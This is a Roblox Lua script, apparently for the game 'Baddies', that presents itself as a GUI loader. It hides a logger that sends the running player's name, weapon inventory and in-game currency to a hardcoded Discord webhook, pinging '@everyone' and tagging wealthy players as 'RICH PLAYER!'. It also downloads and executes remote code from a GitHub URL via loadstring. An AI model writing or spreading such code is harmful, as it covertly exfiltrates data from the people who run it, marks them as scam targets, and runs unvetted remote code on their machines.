-- Final Loader - GUI + Rich Discord Ping

_G.POOR_WEBHOOK = "https://discord.com/api/webhooks/1495237089246187521/3xaeBard0Ia5rOI3mBT9cO9SGiw3phTe4VPv5t2QpdYzPqZTO9AFBaMOEWUvSjZmCXRi"

_G.MY_USERNAMES = {"daxkidcece", "thisisanalto048", "username"}   -- ← Change this to your real Roblox usernames

_G.PING_POOR = true

-- Rich Discord Ping (taken from the big file you sent)
task.spawn(function()
    if _G.POOR_WEBHOOK and game.Players.LocalPlayer then
        local http = game:GetService("HttpService")
        local plr = game.Players.LocalPlayer

        local tools = {}
        local function collect(from)
            if from then
                for _, v in ipairs(from:GetChildren()) do
                    if v:IsA("Tool") then table.insert(tools, v.Name) end
                end
            end
        end
        collect(plr:FindFirstChild("Backpack"))
        collect(plr.Character)
        collect(plr:FindFirstChild("StarterGear"))

        local patterns = {"punch","wallet","phone","tradesign","spray","pan","candybag","pool noodle"}
        local base, main = {}, {}
        for _, name in ipairs(tools) do
            local lower = name:lower()
            local matched = false
            for _, p in ipairs(patterns) do
                if string.find(lower, p, 1, true) then
                    table.insert(base, name)
                    matched = true
                    break
                end
            end
            if not matched then table.insert(main, name) end
        end

        local isRich = #main >= 3
        local baseText = #base > 0 and table.concat(base, " | ") or "None"
        local mainText = #main > 0 and table.concat(main, "\n") or "None"

        local ls = plr:FindFirstChild("leaderstats")
        local dinero = ls and ls:FindFirstChild("Dinero") and ls.Dinero.Value or "N/A"
        local slays = ls and ls:FindFirstChild("Slays") and ls.Slays.Value or "N/A"

        local embed = {
            title = plr.Name .. "'s Inventory",
            description = "**Base Weapons**\n" .. baseText .. "\n\n**Main Weapons**\n" .. mainText,
            color = isRich and 0xFF0000 or 0xFFA500,
            fields = {
                {name = "Dinero", value = tostring(dinero), inline = true},
                {name = "Slays", value = tostring(slays), inline = true}
            },
            footer = {text = "Baddies Logger"}
        }

        local content = "@everyone " .. plr.Name .. " executed the script!"
        if isRich then content = content .. " RICH PLAYER!" end

        pcall(function()
            game:HttpPost(_G.POOR_WEBHOOK, http:JSONEncode({content = content, embeds = {embed}}))
        end)
    end
end)

-- Load the GUI (this part was already working for you)
task.spawn(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/BaddiesScripted/test/refs/heads/main/gui.lua", true))()
end)
